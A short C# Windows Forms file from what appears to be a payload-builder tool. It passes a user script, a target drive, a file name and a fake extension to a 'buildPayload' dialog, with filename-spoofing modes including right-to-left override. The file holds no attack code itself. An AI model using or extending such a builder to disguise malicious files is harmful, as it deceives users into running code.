using System.Linq;
using System.Windows.Forms;

namespace masamangalternatibo {
    public partial class minipad : Form {
        public minipad() {
            InitializeComponent();
        }

        public string[] _tmp;

        private void btnCompileScript_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e) {
            using (buildPayload _bp = new buildPayload()) {
                using (Form1 _f1 = new Form1()) {
                    if (_f1.radOverflow.Checked) { _bp.overflowCount = _f1.overflowCount; }

                    if (_f1.radNone.Checked) {
                        _bp.spoofMode = 0;
                    }
                    if (_f1.radOverflow.Checked) {
                        _bp.spoofMode = 1;
                    }
                    if (_f1.radRTLO.Checked) {
                        _bp.spoofMode = 2;
                    }
                    _bp.drive = _f1.drpDrives.GetItemText(_f1.drpDrives.SelectedItem);
                    _bp.script = mprtb.Text;
                    _bp.tbFlNm.Text = _tmp[0];
                    _bp.tbFkExt.Text = _tmp[1];
                    this.Close();
                    _bp.ShowDialog();
                }
            }
        }
    }
}
